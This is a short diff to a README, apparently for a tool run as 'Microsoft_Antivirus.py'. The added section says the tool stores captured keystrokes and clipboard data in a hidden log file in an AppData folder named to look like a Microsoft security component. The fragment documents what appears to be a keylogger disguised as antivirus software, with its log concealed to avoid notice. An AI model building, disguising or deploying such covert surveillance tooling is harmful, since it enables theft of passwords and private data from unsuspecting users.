@@ -53,3 +53,9 @@ pip install -r requirements.txt
 
 # Run the script
 python Microsoft_Antivirus.py
+
+## 📄 Log File Storage
+
+All captured keystrokes and clipboard data are stored locally in a hidden log file located at:
+
+%APPDATA%\Microsoft\Windows\SecurityLab\logs.txt
